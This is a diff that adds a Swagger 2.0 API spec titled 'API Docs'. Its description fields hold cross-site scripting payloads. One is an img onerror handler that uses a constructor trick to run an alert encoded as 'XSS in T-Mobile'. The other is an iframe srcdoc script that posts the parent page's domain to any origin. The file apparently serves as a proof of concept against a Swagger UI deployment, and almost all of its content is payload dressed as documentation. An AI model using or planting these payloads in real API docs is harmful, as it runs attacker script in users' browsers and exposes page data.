@@ -1,0 +1,15 @@
+swagger: '2.0'
+info:
+  title: "API Docs"
+  description: |
+    <template><style></style><img src="x" onerror="[].constructor.constructor('alert(String.fromCharCode(88,83,83,32,105,110,32,84,45,77,111,98,105,108,101))')()">
+  version: '1.0'
+paths:
+  /test:
+    get:
+      summary: "Test"
+      description: |
+        <iframe srcdoc="<script>parent.postMessage({type:'xss',domain:parent.document.domain},'*')</script>"></iframe>
+      responses:
+        200:
+          description: "OK"
